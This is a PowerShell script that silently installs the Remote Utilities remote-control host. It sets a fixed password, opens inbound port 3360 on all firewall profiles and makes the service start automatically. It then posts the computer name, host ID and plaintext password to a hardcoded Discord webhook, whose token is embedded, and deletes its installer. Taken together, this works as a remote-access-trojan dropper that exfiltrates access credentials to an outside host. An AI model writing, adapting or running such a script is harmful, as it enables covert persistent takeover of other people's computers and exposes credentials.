# Remote Utilities free install + Discord webhook notification

$discordWebhook = if ($env:RU_DISCORD_WEBHOOK) { $env:RU_DISCORD_WEBHOOK } else { "https://discord.com/api/webhooks/1493692725919219792/LCiq_4OQ2jPQyPD9SrkMx7ux7oHAhSQOS5s4NZ1_H4aXU4eVpZm4SS2c8NsLwRVE2xGT" }
$hostPassword  = "FreePwd123!"
$downloadUrl   = "https://www.remoteutilities.com/download/host-7.7.3.0.exe"
$installerPath = "$env:TEMP\RU-Setup.exe"
$hostName      = $env:COMPUTERNAME
$hostKey       = "HKLM:\SOFTWARE\Remote Utilities\Host"

Write-Host "Downloading Remote Utilities Host..."
Invoke-WebRequest -Uri $downloadUrl -OutFile $installerPath -UseBasicParsing

Write-Host "Installing silently..."
Start-Process -FilePath $installerPath -ArgumentList "/SILENT","/NORESTART" -Wait -NoNewWindow

Start-Sleep -Seconds 5

if (-not (Test-Path $hostKey)) { New-Item -Path $hostKey -Force | Out-Null }
Set-ItemProperty -Path $hostKey -Name "HostName" -Value $hostName
$md5     = [System.Security.Cryptography.MD5]::Create()
$hashHex = ($md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hostPassword)) | ForEach-Object { $_.ToString("x2") }) -join ""
Set-ItemProperty -Path $hostKey -Name "PasswordEnabled" -Value 1
Set-ItemProperty -Path $hostKey -Name "PasswordMD5" -Value $hashHex

New-NetFirewallRule -DisplayName "Remote Utilities Host" -Direction Inbound -Protocol TCP -LocalPort 3360 -Action Allow -Profile Any -ErrorAction SilentlyContinue

$service = Get-Service | Where-Object { $_.DisplayName -like "*Remote Utilities*" } | Select-Object -First 1
if ($service) {
    Set-Service -Name $service.Name -StartupType Automatic
    Start-Service -Name $service.Name
    Write-Host "Service started: $($service.Name)"
} else {
    Write-Warning "Service not found - may need a reboot to complete install."
}

Start-Sleep -Seconds 5
$hostID = (Get-ItemProperty -Path $hostKey -Name HostID -ErrorAction SilentlyContinue).HostID

if ($discordWebhook -and $hostID) {
    $payload = '{"username":"RU-Installer","embeds":[{"title":"Host Ready","description":"**' + $hostName + '**","color":65280,"fields":[{"name":"Host ID","value":"' + $hostID + '","inline":true},{"name":"Password","value":"' + $hostPassword + '","inline":true}]}]}'
    try { Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType "application/json" -Body $payload; Write-Host "Discord notified." }
    catch { Write-Warning "Discord failed: $_" }
} else {
    Write-Warning "Host ID not found or webhook missing. Host ID: $hostID"
}

Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
Write-Host "Done. Host ID: $hostID"
